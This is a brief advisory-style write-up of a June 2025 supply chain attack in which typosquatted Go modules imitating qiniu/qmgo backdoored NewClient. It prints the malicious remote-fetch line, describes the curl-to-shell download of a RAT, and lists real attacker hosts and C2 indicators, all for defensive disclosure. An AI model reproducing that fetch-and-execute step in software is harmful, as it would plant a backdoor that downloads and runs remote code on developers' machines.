# MongoDB Go Module Supply Chain Attack: GitLab's Detection of a Live Typosquat

**Date:** June 2025  
**Packages:** `github.com/qiniiu/qmgo`, `github.com/qiiniu/qmgo` (typosquats of `github.com/qiniu/qmgo`)  
**Type:** Software Supply Chain Attack / Typosquatting / Backdoor

## Summary

GitLab's Vulnerability Research team detected a live supply chain attack in the Go ecosystem using their automated typosquatting detection system. The threat actor published malicious Go modules mimicking the popular MongoDB driver `github.com/qiniu/qmgo`, inserting a multi-layer backdoor into the `NewClient` function. The malware deployed a persistent remote access trojan (RAT) with shell access, screenshot capture, SOCKS proxy, and filesystem browsing capabilities.

## Attack Architecture

The attack used **4 layers** of obfuscation:

### Layer 1: Typosquatted Module
`github.com/qiniiu/qmgo` (one extra "i" — `qiniu` → `qiniiu`) contained malicious code in `client.go`, inside the `NewClient` function that developers naturally call to initialize MongoDB connections.

### Layer 2: Remote Payload Fetching
```go
txt, err := script.Get("https://raw.githubusercontent.com/qiiniu/vue-element-admin/refs/heads/main/public/update.html").String()
```
The fetched URL contained: `https://img.googlex.cloud/seed.php`

### Layer 3: Shell Command Execution
The PHP endpoint returned a command that used `curl` to fetch `http://207.148.110.29:80/logon61.gif` and execute the response as a shell script. That shell script then downloaded the final binary and saved it on disk as `/tmp/vod` (named `chainelli.mp3`), made it executable, ran it, and immediately deleted it.

### Layer 4: Persistent RAT
The downloaded file (on-disk name `chainelli.mp3`) was actually a **statically-linked, stripped ELF Go binary** — a full remote administration trojan:
- Complete remote shell access
- Screenshot capture capability
- SOCKS5 proxy functionality through the compromised machine
- Custom encrypted C2 protocol using hardcoded RSA keys
- C2 server: `ellipal.spoolsv.cyou:443`
- Configurable sleep intervals to avoid detection

## Timeline

| Date | Event |
|------|-------|
| June 2025 | GitLab's Vulnerability Research team detects `qiniiu/qmgo` and reports it to Go Security and GitHub |
| June 2025 | The malicious module is taken down |
| ~4 days later | A second typosquat (`qiiniu/qmgo`) appears — detected and removed quickly |

> Note: exact per-day dates for the takedown/account-suspension steps are not confirmed by the published GitLab report (posted June 30, 2025), so they are given as approximate here.

## Impact

- The threat actor **redeployed** within 4 days after takedown, showing persistence and adaptation
- MongoDB modules are widely used in Go — a legitimate MongoDB driver compromise could affect thousands of projects
- The malware's C2 protocol used custom RSA encryption, making network detection difficult

## Key Lesson

Supply chain attackers are becoming **more sophisticated**: multi-layer payloads, encrypted C2, rapid redeployment after takedown. Go developers must:
- **Verify exact module paths** — one character difference can be malicious
- Use **Software Composition Analysis** tools to detect typosquatting
- **Pin dependency versions** and verify checksums
- Be aware that even "working" code can hide malware in critical initialization functions

## References

- https://about.gitlab.com/blog/gitlab-catches-mongodb-go-module-supply-chain-attack/
- https://about.gitlab.com/blog (original GitLab security research post, June 30, 2025)
